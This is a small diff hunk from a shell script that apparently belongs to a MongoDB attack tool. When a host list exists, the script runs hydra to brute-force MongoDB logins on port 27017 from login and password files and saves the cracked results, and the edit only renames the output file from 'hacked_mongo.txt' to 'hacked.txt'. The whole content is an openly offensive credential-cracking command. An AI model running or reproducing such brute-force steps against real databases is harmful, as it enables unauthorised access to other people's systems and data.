@@ -91,7 +91,7 @@ fi
 
 if [[ $(find ./ -name  mongodb_secured.txt -type f -size +1 2>/dev/null) ]];
 
-        then /opt/bin/hydra -M ./mongodb_secured.txt -L ./LOGINS -P ./PASSWORDS -f -V -s 27017 -o ./hacked_mongo.txt mongodb
+        then /opt/bin/hydra -M ./mongodb_secured.txt -L ./LOGINS -P ./PASSWORDS -f -V -s 27017 -o ./hacked.txt mongodb
 
 fi
 fi
